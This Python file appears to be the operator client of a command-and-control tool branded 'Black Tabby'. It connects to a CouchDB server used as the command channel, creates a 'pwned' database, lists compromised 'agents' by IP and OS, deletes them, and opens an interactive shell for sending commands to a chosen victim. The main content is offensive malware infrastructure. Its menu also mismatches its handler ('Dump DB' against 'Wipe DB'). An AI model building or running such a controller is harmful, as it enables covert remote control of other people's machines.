from __future__ import print_function, unicode_literals
import json
import couchdb
import pyfiglet
from colorama import Fore, Back, Style
from PyInquirer import style_from_dict, Token, prompt, Separator
from examples import custom_style_2,custom_style_1,custom_style_3
import sys
from shell import Shell
import requests

class Client(object):

	def banner(self):
	    print("\n\n")
	    result = pyfiglet.figlet_format("Black", font = "gothic") # lean/alligator/hollywood/gothic
	    print(Fore.RED + result)
	    print(Style.RESET_ALL)

	def banner2(self):
		result2 = pyfiglet.figlet_format("Tabby", font = "gothic")
		print(Fore.RED + result2)
		print(Style.RESET_ALL)


	def connect_database(self):
		questions = [
		    {
		        'type': 'input',
		        'name': 'username',
		        'message': 'Enter Username'
		    },
		    {
		        'type': 'password',
		        'name': 'password',
		        'message': 'Enter Password'
		    },
		    {
		        'type': 'input',
		        'name': 'ip',
		        'message': 'Enter IP',
		    },
		    {
		    	'type':'input',
		    	'name':'port',
		    	'message': 'Enter Port'

		    }
		]

		answers = prompt(questions, style=custom_style_3)
		#print(answers)
		self.couchserver = couchdb.Server("http://{}:{}@{}:{}".format(answers['username'],answers['password'],answers['ip'],answers['port']))
		if (self.couchserver):
			print( Fore.GREEN + "*** Connection Success ***")
			print(Style.RESET_ALL)
		else:
			print(Fore.RED + "!!! Error Connecting to database confirm the couch db docker container is running !!!")
			print(Style.RESET_ALL)
			sys.exit(1)
		if 'pwned' not in self.couchserver:
			print(Fore.RED + "*** Pwned database not found. ***")
			print(Fore.RED + "*** Creating database now... ***")
			print(Style.RESET_ALL)
			self.couchserver.create('pwned')
			print(Fore.GREEN + "*** Successfully Created pwnd DB... ***")
			print(Style.RESET_ALL)
			self.db = self.couchserver['pwned']
			print(Fore.YELLOW + "Attempting to create view")
			print(Style.RESET_ALL)
			view = self.create_view(answers['username'],answers['password'],answers['ip'],answers['port'])
			if view:
				print(Fore.GREEN + "Created View")
				print(Style.RESET_ALL)
			else:
				print(Fore.RED + "Failed to create View")
				print(Style.RESET_ALL)

		else:
			print(Fore.GREEN + "*** Success pwned DB Found ***")
			print(Style.RESET_ALL)
			self.db = self.couchserver['pwned']






	def MainMenuQuestions(self):
	    questions = [
	        {
	            'type': 'list',
	            'name': 'Section',
	            'message': 'Choose From the Options Below',
	            'choices': [
	                'List Agents',
	                'Connect To Agent',
	                'Delete Agent',
	                'Dump DB',
	                'Exit'
	            ]
	        }
	    ]
	    answers = prompt(questions, style=custom_style_3)
	    return answers

	def create_view(self,username,password,ip,port):
		try:
			data = open('doc_view.js','rb').read()
			resp = requests.put("http://{}:{}@{}:{}/pwned/_design/list_agents".format(username,password,ip,port),data=data)
			return True
		except:
			print("Error Creating View")
			return False




	def MainMenuAnswers(self,argument):
	    ## this function decides what function to run based on first menu questions function input
	    ## this basically acts as a switch statement for the functions listed in the main menu
	    switcher = {
	        "List Agents": self.list_slaves,
	        "Connect To Agent": self.cmd_slave,
	        "Delete Agent": self.del_agent,
	        "Wipe DB": self.dump_db,
	        "Exit": self.exit
	    }
	    # Get the function from switcher dictionary
	    func = switcher.get(argument)
	    # Execute the function
	    return func()

	def list_slaves(self):
		print(Fore.YELLOW + "*** Agent List ***")
		print(Style.RESET_ALL)
		counter = 0
		self.agent_list = []
		if self.db.view('list_agents/agent'):
			for x in self.db.view('list_agents/agent'):
				counter +=1
				self.agent_list.append(x.id)
				#y = x.value 
				print(x.value) 
				#ip = json.loads(y['IP'])
				print(Fore.YELLOW +"### ===========  #{} ============ ###".format(counter))
				print(Fore.YELLOW + "ID: ",x.id)
				print(Fore.YELLOW +"IP: ",x.value['IP'])
				print(Fore.YELLOW+ "OS: ",x.value['OS']) 
			print(Style.RESET_ALL)
			return True
		else:
			print(Fore.YELLOW + "*** No Agents Available ***")
			print(Style.RESET_ALL)
			return False
			

	def cmd_slave(self):
		if self.list_slaves():		
			print(self.agent_list)
			questions = [{'type':'list','name':'agent_listing','message':'choose agent','choices':self.agent_list}]	
			answers = prompt(questions,style=custom_style_3)
			print(answers)
			self.agent_id = answers['agent_listing']
			self.controlling_agent(self.agent_id)
			return self.agent_id
		else:
			return


	def controlling_agent(self,agent_id):
		print(agent_id)
		shell = Shell() ### check shell.py
		shell.agent_id = agent_id
		shell.db_connection = self.db
		shell.cmdloop()



	def del_agent(self):
		if self.list_slaves():
			print(self.agent_list)
			questions = [{'type':'list','name':'agent_listing','message':'Choose Agent To Delete','choices':self.agent_list}]
			answers = prompt(questions,style=custom_style_3)
			doc = self.db[answers['agent_listing']]
			self.db.delete(doc)
			print(Fore.GREEN + "*** Successfully Deleted Agent ***")
			print(Style.RESET_ALL)
			return True
		else:
			print(Fore.YELLOW + "*** No Agents Available ***")
			print(Style.RESET_ALL)
			return False



	def dump_db(self):
		print("deleting database")

	def exit(self):
		print(Style.RESET_ALL)
		print("exit")
		sys.exit(0)





	def main(self):
		cli = Client()
		cli.banner()
		cli.banner2()
		cli.connect_database()
		while True:
			self.answer = cli.MainMenuQuestions()
			cli.MainMenuAnswers(self.answer['Section'])


if __name__ == "__main__":
	Client().main()